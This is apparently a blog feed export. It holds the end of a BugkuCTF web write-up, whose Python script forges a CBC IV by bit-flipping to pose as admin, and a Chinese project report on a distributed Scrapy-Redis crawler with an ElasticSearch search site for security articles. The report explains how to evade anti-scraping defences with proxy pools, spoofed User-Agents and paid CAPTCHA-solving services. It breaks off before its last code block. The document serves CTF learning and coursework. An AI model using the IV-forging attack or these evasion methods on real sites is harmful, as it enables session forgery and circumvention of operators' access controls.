<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 新页面得到的iv</span></span><br><span class="line">iv = unquote(<span class="string">'pW4LieJ5j8bVoEFMORTYPA%3D%3D'</span>)</span><br><span class="line"><span class="comment"># 回显的plain值</span></span><br><span class="line">plain = <span class="string">'VxqqyZUYQyfs7WUL/CM2TW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IkxldGhlIjt9'</span></span><br><span class="line"></span><br><span class="line">plain = b64decode(plain).decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">iv = b64decode(iv).decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line"></span><br><span class="line">right = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line"></span><br><span class="line">newiv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    newiv += chr(ord(right[i]) ^ ord(iv[i]) ^ ord(plain[i]))</span><br><span class="line">    </span><br><span class="line">print(quote(b64encode(newiv.encode(<span class="string">'latin-1'</span>)).decode()))</span><br></pre></td></tr></table></figure>
<p>将得到的值修改为iv，刷新页面得到flag：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20191204111714822.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ISASearch:基于分布式爬虫的信安技术文章搜索引擎</title>
    <url>/2020/06/22/ISASearch/</url>
    <content><![CDATA[<h1 id="摘-要"><a href="#摘-要" class="headerlink" title="摘 要"></a>摘 要</h1><p>随着大数据时代的到来，信息的获取与检索尤为重要，如何在海量的数据中快速准确获取到我们需要的内容显得十分重要。因此本项目为了更好的整合利用安全领域特有的社区资源优势，首先使用Scrapy爬虫框架结合NoSQL数据库Redis编写分布式爬虫，并对先知、安全客、嘶吼三个知名安全社区进行技术文章的爬取；然后选取ElasticSearch搭建搜索服务，同时提供了RESTful web接口；最后通过Django搭建可视化站点，供用户透明的对文章进行搜索。</p>
<p><strong>关键词:</strong> 分布式爬虫; Scrapy; 搜索引擎; Redis</p>
<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>With the advent of the era of big data, the acquisition and retrieval of information is particularly important. How to get the content we need quickly and accurately in massive data is very important. Therefore, in order to better integrate and utilize the unique community resource advantage in the security field, this project firstly uses the Scrapy crawler framework combined with NoSQL database Redis to write distributed crawler, and then crawl for technical articles to three well-known security communities: XianZhi, AnQuanKe and RoarTalk. Then select ElasticSearch to build the search service while providing a RESTful Web interface. Finally, the visual site is built through Django for users to search articles transparently.</p>
<p><strong>Key words:</strong> distributed crawler; Scrapy; Search engines; Redis</p>
<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><p>爬虫的应用领域非常广泛，目前利用爬虫技术市面上已经存在了比较成熟的搜索引擎产品，如百度、谷歌，以及其他垂直领域搜索引擎，这些都是非直接目的；还有一些推荐引擎，如今日头条，可以定向给用户推荐相关新闻；爬虫还可以用来作为机器学习的数据样本。</p>
<p>本项目的主要目的是为了更好的整合利用安全领域特有的社区资源优势。首先使用Scrapy爬虫框架结合NoSQL数据库Redis编写分布式爬虫，并对先知、安全客、嘶吼三个知名安全社区进行技术文章的爬取；然后选取ElasticSearch搭建搜索服务，同时提供了RESTfulweb接口；最后通过Django搭建可视化站点，供用户透明的对文章进行搜索。</p>
<p>最终通过本项目可以更加透彻的理解爬虫的相关知识；在熟练运用Python语言的基础上，更加深入的掌握开源的爬虫框架Scrapy，为后续其他与爬虫相关的业务奠定理论基础和数据基础；进一步理解分布式的概念，为大数据的相关研究和硬件条件奠定基础；熟练掌握Python搭建网站的框架Django，深入理解基于Lucene的搜索服务器ElasticSearch。</p>
<h1 id="2-技术选型"><a href="#2-技术选型" class="headerlink" title="2 技术选型"></a>2 技术选型</h1><h2 id="2-1-Scrapy-Redis分布式爬虫"><a href="#2-1-Scrapy-Redis分布式爬虫" class="headerlink" title="2.1 Scrapy-Redis分布式爬虫"></a>2.1 Scrapy-Redis分布式爬虫</h2><h3 id="2-1-1-Redis"><a href="#2-1-1-Redis" class="headerlink" title="2.1.1 Redis"></a>2.1.1 Redis</h3><p>Redis是完全开源免费的，遵守BSD协议的，高性能的key-value数据库。Redis与其他key-value 缓存产品有以下三个特点：</p>
<p>（1）Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。这样可以防止数据的丢失，在实际生产应用中数据的完整性是必须保证的。</p>
<p>（2）Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。这些功能更强大的数据存储方式极大地节约了存储空间，优化了查询的性能，大大提高了查询效率。存储的目的是为了后期更好的取出，Redis很好地做到了这一点。</p>
<p>（3）Redis支持数据的备份，即master-slave模式的数据备份。主从结构目前是大数据里面的主流结构，主从模式能保证数据的健壮性和高可用。当出现电脑宕机，硬盘损坏等重大自然原因时，主从模式能很好的保证存储的数据不丢失，随时恢复到可用状态。</p>
<h3 id="2-1-2-Scrapy"><a href="#2-1-2-Scrapy" class="headerlink" title="2.1.2 Scrapy"></a>2.1.2 Scrapy</h3><p>Scrapy的原理如下所示：</p>
<p><img src="/2020/06/22/ISASearch/8c591d54457bb033812a2b0364011e9c.png" alt></p>
<p>各个组件的解释如下：</p>
<p>（1）Scrapy Engine(引擎)：负责Spider、Item Pipeline、Downloader、Scheduler中间的通讯，信号、数据传递等，相当于人的大脑中枢，机器的发动机等，具有显著的作用。</p>
<p>（2）Scheduler(调度器)：负责接收引擎发送过来的Request请求，并按照一定的方式逻辑进行整理排列，入队，当引擎需要时，再交还给引擎。</p>
<p>（3）Downloader（下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理。</p>
<p>（4）Spider（爬虫）：负责处理所有的Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器)。</p>
<p>（5）Item Pipeline(管道)：负责处理Spider中获取到的Item，并进行后期处理（详细分析、过滤、存储等）。</p>
<p>（6）Downloader Middlewares（下载中间件）：可以当作是一个可以自定义扩展下载功能的组件。</p>
<p>（7）Spider Middlewares（Spider中间件）：可以理解为是一个可以自定义扩展和操作引擎以及Spider中间通信的功能组件（例如进入Spider的Responses;和从Spider出去的Requests）。</p>
<p>整个Scrapy爬虫框架执行流程可以理解为：爬虫启动的时候就会从start_urls提取每一个URL，然后封装成请求，交给engine，engine交给调度器入队列，调度器入队列去重处理后再交给下载器去下载，下载返回的响应文件交给parse方法来处理，parse方法可以直接调用XPATH方法提取数据了。</p>
<p>Scrapy是一个通用的爬虫框架，但是不支持分布式，Scrapy-Redis是为了更方便地实现Scrapy分布式爬取，而提供了一些以Redis为基础的组件，具体的分布式Scrapy-Redis介绍见本文3.3章节。</p>
<h2 id="2-2-MySQL数据存储"><a href="#2-2-MySQL数据存储" class="headerlink" title="2.2 MySQL数据存储"></a>2.2 MySQL数据存储</h2><p>MySQL是一个关系型数据库管理系统，最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS 应用软件之一。MySQL是一种关系型数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p>
<p>正是基于MySQL体积小、速度快、成本低的特点，本项目使用它对爬取下来的数据进行长期稳定的存储，同时利用Scrapy还可以异步进行数据的存储。在本项目中，我们要爬取的数据至少包括：文章题目、文章内容、文章链接、文章标签、作者、发表时间、访问量、封面图等。</p>
<p><img src="/2020/06/22/ISASearch/89c0fb275de3aa6f4b6ff1244132c353.png" alt></p>
<p><img src="/2020/06/22/ISASearch/7d1b6a4f4ded363b181dd18d49108720.png" alt></p>
<h2 id="2-3-Django搭建搜索网站"><a href="#2-3-Django搭建搜索网站" class="headerlink" title="2.3 Django搭建搜索网站"></a>2.3 Django搭建搜索网站</h2><p>Django是一个开放源代码的Web应用框架，由Python开发的基于MVC构造的框架。在Django中，控制器接受用户输入的部分由框架自行处理，因此更加关注模型，模板和视图，即MVT。</p>
<ul>
<li><p>模型（Model），即数据存取层，处理与数据相关的所有事物：包括如何存取，如何验证有效性，数据之间的关系等。</p>
</li>
<li><p>视图（View），即表现层，处理与表现相关的逻辑，主要是显示的问题。</p>
</li>
<li><p>模板（Template），即业务逻辑层，主要职责是存取模型以及调取恰当模板的相关逻辑。</p>
</li>
</ul>
<p>控制器部分，由Django框架URLconf来实现，而URLconf机制恰恰又是使用正则表达式匹配URL，然后调用合适的函数。因此只需要写很少量的代码，只需关注业务逻辑部分，大大提高了开发的效率。使用Django搭建搜索引擎的界面，简单便捷且界面交互效果良好，适应需求，无须成本。同时Scrapy与Django的代码模式有些类似，如Django中的Model与Scrapy中的Item，Scrapy也提供了相应的DjangoItem类，其从Django模型中获取字段(field)定义。</p>
<h2 id="2-4-ElasticSearch搜索引擎"><a href="#2-4-ElasticSearch搜索引擎" class="headerlink" title="2.4 ElasticSearch搜索引擎"></a>2.4 ElasticSearch搜索引擎</h2><p>ElasticSearch是一个基于Lucene的实时的分布式搜索和分析引擎，设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用非常方便。基于RESTful接口。ElasticSearch具有广泛的用户，如DELL，GitHub，Wikipedia等。</p>
<p>ElasticSearch和关系型数据库之间的对比如下所示：</p>
<table>
<thead>
<tr>
<th>Index（索引库）</th>
<th>Database（数据库）</th>
</tr>
</thead>
<tbody>
<tr>
<td>Type（类型）</td>
<td>Table（表）</td>
</tr>
<tr>
<td>Document（文档）</td>
<td>Row（行）</td>
</tr>
<tr>
<td>Field（字段）</td>
<td>Column（列）</td>
</tr>
</tbody>
</table>
<h3 id="2-4-1-Elasticsearch-RTF"><a href="#2-4-1-Elasticsearch-RTF" class="headerlink" title="2.4.1 Elasticsearch-RTF"></a>2.4.1 Elasticsearch-RTF</h3><p>Elasticsearch-RTF是针对中文的一个发行版，使用稳定的Elasticsearc版本，并且下载测试好对应的插件，如中文分词插件等，目的是可以下载下来就可以直接的使用。项目构建过程中选择的是 Elasticsearch-RTF 5.1.1 版本。安装后启动，效果如下所示，通常运行在9200端口：</p>
<p><img src="/2020/06/22/ISASearch/19e5abf6bdcb2c7ccb9f82faf51d2a2a.png" alt></p>
<h3 id="2-4-2-Elasticsearch-head"><a href="#2-4-2-Elasticsearch-head" class="headerlink" title="2.4.2 Elasticsearch-head"></a>2.4.2 Elasticsearch-head</h3><p>ElasticSearch-head是一个Web前端插件，用于浏览Elastic⁃Search集群并与之进行交互，它可以作为ElasticSearch插件运行，一般首选这种方式，当然它也可以作为独立的Web应用程序运行。它的通用工具有三大操作：</p>
<p>ClusterOverview，显示当前集群的拓扑，并允许执行索引和节点级别的操作；有几个搜索接口可以查询原生Json或表格格式的检索结果；显示集群状态的几个快速访问选项卡；一个允许任意调用RESTful API的输入部分。</p>
<p>运行结果如下，通常运行在9100端口：</p>
<p><img src="/2020/06/22/ISASearch/e047a431e9b7b1df53550d51e7abcb15.png" alt></p>
<h3 id="2-4-3-Kibana"><a href="#2-4-3-Kibana" class="headerlink" title="2.4.3 Kibana"></a>2.4.3 Kibana</h3><p>Kibana是一个开源的分析与可视化平台，设计出来用于和Elasticsearch一起使用的。可以用kibana搜索、查看、交互存放在Elasticsearch索引里的数据，使用各种不同的图表、表格、地图等。kibana能够很轻易地展示高级数据分析与可视化。Kibana使理解大量数据变得容易。它简单、基于浏览器的接口能快速创建和分享实时展现Elasticsearch查询变化的动态仪表盘。Kibana启动完成后，可看到插入数据和页面查询显示结果，通常运行在5607端口：</p>
<p><img src="/2020/06/22/ISASearch/6b80d351bf473c6765fb386b69c8226a.png" alt></p>
<h1 id="3-实现细节"><a href="#3-实现细节" class="headerlink" title="3 实现细节"></a>3 实现细节</h1><h2 id="3-1-处理反爬"><a href="#3-1-处理反爬" class="headerlink" title="3.1 处理反爬"></a>3.1 处理反爬</h2><h3 id="3-1-1-更换随机User-Agent"><a href="#3-1-1-更换随机User-Agent" class="headerlink" title="3.1.1 更换随机User-Agent"></a>3.1.1 更换随机User-Agent</h3><p>反爬措施：网站在处理反爬的过程中，很常见的一种方式就是通过检测User-agent来拒绝非浏览器的访问。</p>
<p>作为应对，我们需要在每次发送请求时加上浏览器的User-Agent字段，可以在Scrapy的middlewares.py中自定义RandomUserAgentMiddleware类，并作为Download Middleware启用。Download Middware是引擎和下载器的中间件，每个Request在爬取之前都会调用其中开启的类，从而对Request进行一定的处理，在这里就是对每个请求加上随机的User-Agent。</p>
<p><img src="/2020/06/22/ISASearch/f998238e495c44d9c9a9c28e759d5e30.png" alt></p>
<p>关于如何获取到随机的User-Agent，可以通过fake_useragent库获取，实际上这个库的作者维护了一个User-Agent的集合，使用方法如下,通过实例化UserAgent类，可以利用random随机取出一个User-agent以供使用：</p>
<p><img src="/2020/06/22/ISASearch/53543fefec84a97b72e2e21c7b567389.png" alt></p>
<h3 id="3-1-2-使用IP代理池"><a href="#3-1-2-使用IP代理池" class="headerlink" title="3.1.2 使用IP代理池"></a>3.1.2 使用IP代理池</h3><p>反爬措施：如果同一个IP地址访问过于频繁时，就直接将访问的IP地址进行封锁，短期内进行访问。</p>
<p>对于这种反爬手段，可以维护一个IP代理池，当IP被封锁时进行IP的更换，或者通过代理隐藏自己的IP。目前网上提供代理的网站服务有不少，通常是充值一定的费用，就可以使用它提供的代理IP。由于本项目中对代理池的需求不大，因此仅是使用一个免费的代理网站进行演示，如下：</p>
<p><img src="/2020/06/22/ISASearch/141448591d8ab513c1a7695ae8a2711c.png" alt></p>
<p>为了获取该网站上的代理IP地址，可以单独写一个小爬虫将该网站提供的http代理爬取到数据库proxy_ip中：</p>
<p><img src="/2020/06/22/ISASearch/d7eea65aafae73b89b2b266e5c70b9c6.png" alt></p>
<p>同样是以Download Middleware的方式，在Request爬取前，从数据库中随机取出一个代理，通过代理进行访问并爬取。</p>
<p><img src="/2020/06/22/ISASearch/8ab7b7721b00d7e12fd52d91b0f5b1e6.png" alt></p>
<h3 id="3-1-3-访问频率限制"><a href="#3-1-3-访问频率限制" class="headerlink" title="3.1.3 访问频率限制"></a>3.1.3 访问频率限制</h3><p>反爬措施:如果访问过快的话，会返回其他状态码/跳转等（302、429等）来阻止你继续访问内容页面，如下在爬取嘶吼时候，若访问频率过快，则会出现如下页面：</p>
<p><img src="/2020/06/22/ISASearch/5217710a3607df76b4c4a7eba6c384d9.png" alt></p>
<p>对于这一反爬的应对措施，主要有以下两种思路：</p>
<ul>
<li><p>在Scrapy中可以直接设置每次请求之间的间隔来降低频率。</p>
</li>
<li><p>自定义Middleware在每次接收到的Response被跳转时，将爬虫暂停一段时间再继续爬取。</p>
</li>
</ul>
<p>在本项目中，使用的第二种方法，实现代码如下，在遇到频率先之后将爬虫暂停15秒再继续，经测试，可以有效的处理嘶吼的该反爬措施：</p>
<p><img src="/2020/06/22/ISASearch/c77430f6c57f5364b67b64ca4fe9ea7a.png" alt></p>
<h3 id="3-1-4-Cookie的禁用"><a href="#3-1-4-Cookie的禁用" class="headerlink" title="3.1.4 Cookie的禁用"></a>3.1.4 Cookie的禁用</h3><p>反爬措施：有些网站可以通过跟踪 Cookie 来识别是否是同一个客户端。如果同一个客户端在单位时间内的请求过于频繁，则判断为爬虫，对此客户端进行禁止。</p>
<p>这个处理反爬的方式比较简单，Scrapy 默认开启了 Cookie，而如果爬取过程中不需要登录的话，就可以在setting.py文件中将COOKIES_ENABLED设置为False即可。</p>
<p><img src="/2020/06/22/ISASearch/597b7a1371fe1e0533644d9bae9ed364.png" alt></p>
<h3 id="3-1-5-验证码识别"><a href="#3-1-5-验证码识别" class="headerlink" title="3.1.5 验证码识别"></a>3.1.5 验证码识别</h3><p>反爬措施：在进行登录等操作时，要求用户输入随机生成的验证码，验证码输入正确才能进行下一步的操作。</p>
<p>验证码可以说是当前最常见的一种反爬措施，几乎所有需要登录的地方都需要用户输入验证码来证明操作不是有机器人或者爬虫完成的。验证码的识别问题是一个较为复杂的问题，由于其并不是本项目中的研究重点，因此我们主要考虑如何应用现有的验证码识别方式即可。当前比较常见的验证码识别方式有如下三种：</p>
<ul>
<li><p>编码实现：有能力的情况下可以自己训练模型，通常可以使用谷歌公司提供的tesseract-ocr库，但是对于噪音较多的而验证码来说，识别率并不是很高。</p>
</li>
<li><p>在线打码：即使用某些在线平台提供的api接口，将爬虫获取的验证码图片上传至api，该平台会在内部进行识别，并返回结果。</p>
</li>
</ul>
<p>目前在线打码是使用最多的一种方式，使用起来快捷方便、可以识别多种验证码类型，且准确率较高，缺点就是通常来说需要收费，不过价格也不会太高。代码就是像平台api提供使用者的用户名、密码和验证码即可，下图为验证码的识别效果：</p>
<p><img src="/2020/06/22/ISASearch/7512a119960c5faf6aec50e95ef8a1ca.png" alt></p>
<p><img src="/2020/06/22/ISASearch/d4c5ac4e2dc1bbf4b74eeb35fb2346ed.png" alt></p>
<h2 id="3-2-爬取数据"><a href="#3-2-爬取数据" class="headerlink" title="3.2 爬取数据"></a>3.2 爬取数据</h2><h3 id="3-2-1-先知社区"><a href="#3-2-1-先知社区" class="headerlink" title="3.2.1 先知社区"></a>3.2.1 先知社区</h3><p>对于先知社区的爬取，可以说是比较容易的，该网站逻辑架构简洁明了，首页中即有文章列表和文章分类tab。<br>通过进一步分析可知，每个分类的tab序号不同，通过/tab/1的方式可获取不同种类的文章。</p>
<p><img src="/2020/06/22/ISASearch/d34397e10021178d5f8d7063180b66ff.png" alt></p>
<p>分页也是通过?page=2参数进行分页，也比较的清楚：</p>
<p><img src="/2020/06/22/ISASearch/a49f76fe5fb4f2ac6cd63c75bab87475.png" alt></p>
<p>因此我们的爬虫实现思路如下：</p>
<p>（1）遍历每一个tab页面。</p>
<p>（2）对页面中的每个文章信息进行爬取，包括文章链接。</p>
<p>（3）对步骤2中提取的每个文章页面再进行爬取，取得文章具体信息。</p>
<p>（4）当前页面爬取完后，判断是否存在“下一页”按钮来判断是否爬取完成。</p>
<p>在Scrapy中的Spider代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> XianzhiArticleItem, ArticleItemLoader</span><br><span class="line"><span class="keyword">from</span> ..utils.common <span class="keyword">import</span> get_md5</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianzhiSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'xianzhi'</span>  <span class="comment"># 启动的时候指定名称</span></span><br><span class="line"></span><br><span class="line">    redis_key = <span class="string">'xianzhi:start_urls'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># allowed_domains = ['xz.aliyun.com']</span></span><br><span class="line">    <span class="comment"># start_urls = ['https://xz.aliyun.com/']</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        tabs = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>]</span><br><span class="line">        <span class="keyword">for</span> tab <span class="keyword">in</span> tabs:</span><br><span class="line">            tab_url = response.url + <span class="string">'tab/&#123;&#125;'</span>.format(tab)</span><br><span class="line">            <span class="keyword">yield</span> Request(url=tab_url, callback=self.tab_parse)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 爬取的每个url会进入这个函数，会返回response</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tab_parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="comment"># 解析列表页中的所有文章url并交给scrapy下载后并进行解析</span></span><br><span class="line">        post_nodes = response.css(<span class="string">'table.table.topic-list tr'</span>)</span><br><span class="line">        <span class="keyword">for</span> post_node <span class="keyword">in</span> post_nodes:</span><br><span class="line">            image_url = post_node.css(<span class="string">'a.user-link img::attr(src)'</span>).extract_first()     <span class="comment"># 图片地址</span></span><br><span class="line">            post_url = post_node.css(<span class="string">'a.topic-title::attr(href)'</span>).extract_first()       <span class="comment"># 获取文章的地址</span></span><br><span class="line">            <span class="keyword">yield</span> Request(url=parse.urljoin(response.url, post_url), meta=&#123;<span class="string">"front_image_url"</span>: image_url&#125;,</span><br><span class="line">                          callback=self.parse_detail)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取下一页并交给scrapy下载</span></span><br><span class="line">        next_url = response.css(<span class="string">'div.pagination.clearfix li:nth-child(3) a::attr(href)'</span>).extract_first(<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> next_url <span class="keyword">and</span> next_url.startswith(<span class="string">'?'</span>):</span><br><span class="line">            <span class="keyword">yield</span> Request(url=parse.urljoin(response.url, next_url), callback=self.tab_parse)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span><span class="params">(self, response)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 通过item_loader加载item</span></span><br><span class="line">        item_loader = ArticleItemLoader(item=XianzhiArticleItem(), response=response)</span><br><span class="line">        item_loader.add_value(<span class="string">'front_image_url'</span>, [response.meta.get(<span class="string">'front_image_url'</span>, <span class="string">''</span>)])</span><br><span class="line">        item_loader.add_css(<span class="string">'title'</span>, <span class="string">'.content-title::text'</span>)  <span class="comment"># 添加css选择器</span></span><br><span class="line">        item_loader.add_value(<span class="string">'url'</span>, response.url)</span><br><span class="line">        item_loader.add_value(<span class="string">'url_object_id'</span>, get_md5(response.url))</span><br><span class="line">        item_loader.add_css(<span class="string">'create_date'</span>, <span class="string">'.info-left span:nth-child(3)::text'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'view_count'</span>, <span class="string">'.info-left span:nth-child(5)::text'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'author'</span>, <span class="string">'.info-left span:nth-child(1)::text'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'follow_count'</span>, <span class="string">'#follow-count::text'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'mark_count'</span>, <span class="string">'#mark-count::text'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'content'</span>, <span class="string">'#topic_content'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'tags'</span>, <span class="string">'.content-node a::text'</span>)</span><br><span class="line">        article_item = item_loader.load_item()</span><br><span class="line">        <span class="keyword">yield</span> article_item  <span class="comment"># 传递到pipelines</span></span><br></pre></td></tr></table></figure>
<h3 id="3-2-2-安全客"><a href="#3-2-2-安全客" class="headerlink" title="3.2.2 安全客"></a>3.2.2 安全客</h3><p>安全客的首页看起来比先知社区要复杂一些，并且是鼠标点击“加载更多”来分页的，爬取难度看似更大。但是通过分析翻页时的请求包，发现安全客是也是通过请求api来获取文章的信息的，api链接如下：</p>
<p><a href="https://api.anquanke.com/data/v1/posts?size=20&amp;page=2" target="_blank" rel="noopener">https://api.anquanke.com/data/v1/posts?size=20&amp;page=2</a></p>
<p>我们通过观察此api返回的内容，不难推测到：url中参数size指的是一页请求的文章数量，参数page则是表示当前页数。</p>
<p><img src="/2020/06/22/ISASearch/e87b99e5693a4441c69697e50e8f78e1.png" alt></p>
<p>我们继续分析该api返回的json内容：</p>
<p><img src="/2020/06/22/ISASearch/de747dd0ddb203f60cf11198d3325619.png" alt></p>
<p>除了没有直接给出文章的url以及文章内容之外，我们爬虫所所需要的信息都可以直接获取，只需要简单的解析返回的json即可。</p>
<ul>
<li><p>虽然没有给出文章url但是给出了id，我们容易得到固定的文章url格式为：/post/id/206483，即我们可以通过id来得到文章url。</p>
</li>
<li><p>而文章的内容，我们则需要先用id构造文章url，然后异步发送请求来获取content。</p>
</li>
</ul>
<p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> AnquankeArticleItem, ArticleItemLoader</span><br><span class="line"><span class="keyword">from</span> ..utils.common <span class="keyword">import</span> get_md5</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnquankeSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'anquanke'</span></span><br><span class="line">    redis_key = <span class="string">'anquanke:start_urls'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># allowed_domains = ['api.anquanke.com', 'anquanke.com']</span></span><br><span class="line">    <span class="comment"># start_urls = ['https://api.anquanke.com/data/v1/posts?size=500']</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        res = json.loads(response.text)</span><br><span class="line">        posts = res.get(<span class="string">'data'</span>)</span><br><span class="line">        <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">            <span class="comment"># 剔除掉活动和招聘的文章</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'招聘'</span> <span class="keyword">in</span> post.get(<span class="string">'tags'</span>)) <span class="keyword">or</span> (<span class="string">'活动'</span> <span class="keyword">in</span> post.get(<span class="string">'tags'</span>)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            item_loader = ArticleItemLoader(item=AnquankeArticleItem(), response=response)</span><br><span class="line">            item_loader.add_value(<span class="string">'title'</span>, post.get(<span class="string">'title'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'create_date'</span>, post.get(<span class="string">'date'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'front_image_url'</span>, post.get(<span class="string">'cover'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'author'</span>, post.get(<span class="string">'author'</span>).get(<span class="string">'nickname'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'view_count'</span>, post.get(<span class="string">'pv'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'comment_count'</span>, post.get(<span class="string">'comment'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'like_count'</span>, post.get(<span class="string">'like_count'</span>))</span><br><span class="line">            item_loader.add_value(<span class="string">'tags'</span>, post.get(<span class="string">'tags'</span>))</span><br><span class="line">            <span class="keyword">yield</span> Request(url=<span class="string">'https://www.anquanke.com/post/id/&#123;&#125;'</span>.format(post.get(<span class="string">'id'</span>)),</span><br><span class="line">                          meta=&#123;<span class="string">'article_item'</span>: item_loader&#125;, callback=self.parse_content)</span><br><span class="line">        <span class="comment"># 获取下一页</span></span><br><span class="line">        next_url = res.get(<span class="string">'next'</span>)</span><br><span class="line">        <span class="keyword">if</span> next_url:</span><br><span class="line">            <span class="keyword">yield</span> Request(url=next_url, callback=self.parse)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_content</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        item_loader = response.meta.get(<span class="string">'article_item'</span>, <span class="string">''</span>)</span><br><span class="line">        content = response.css(<span class="string">'div.article-content'</span>).extract_first().replace(<span class="string">'data-original='</span>, <span class="string">'src='</span>)</span><br><span class="line">        item_loader.add_value(<span class="string">'content'</span>, content)</span><br><span class="line">        item_loader.add_value(<span class="string">'url'</span>, response.url)</span><br><span class="line">        item_loader.add_value(<span class="string">'url_object_id'</span>, get_md5(response.url))</span><br><span class="line"></span><br><span class="line">        article_item = item_loader.load_item()</span><br><span class="line">        <span class="keyword">yield</span> article_item</span><br></pre></td></tr></table></figure>
<h3 id="3-2-3-嘶吼"><a href="#3-2-3-嘶吼" class="headerlink" title="3.2.3 嘶吼"></a>3.2.3 嘶吼</h3><p>嘶吼的分页也是通过点击“加载更多”，但是分析后可知其分页方式实际上和先知的类似，即通过?page=2进行分页。</p>
<p><img src="/2020/06/22/ISASearch/5f85061f92b2feaba54f2a12a878ee8c.png" alt></p>
<p>但是这样有个问题是如何判断最后一页，在项目中我尝试了以下两种方法，最终使用了第二个方法：</p>
<ul>
<li><p>首先考虑设置一个变量page，每次翻页时加一，当页面的文章列表为空的时候判断为最后一页，但是Scrapy是异步框架，在快速爬取的过程中page的使用会混乱。</p>
</li>
<li><p>于是考虑设定一个最大的page数，这里页数最多的是web安全分类(126页)，所以我们就默认爬取的每个分类页数都设置为大于126的数（或者更大一些），然后再判断是否存在文章列表，存在就继续爬取，否则就转到下一页。</p>
</li>
</ul>
<p>另外就是嘶吼的文章分类位于首页的“阅读”下拉栏中，但是实际上也已经在htm；</p>
<p>中可以找到：</p>
<p><img src="/2020/06/22/ISASearch/f5b8005110b8d3d1ad536ba9e44dbc53.png" alt></p>
<p><img src="/2020/06/22/ISASearch/8c122bc22e0a18c5ff752d993561be0d.png" alt></p>
<p>实现代码如下：</p>
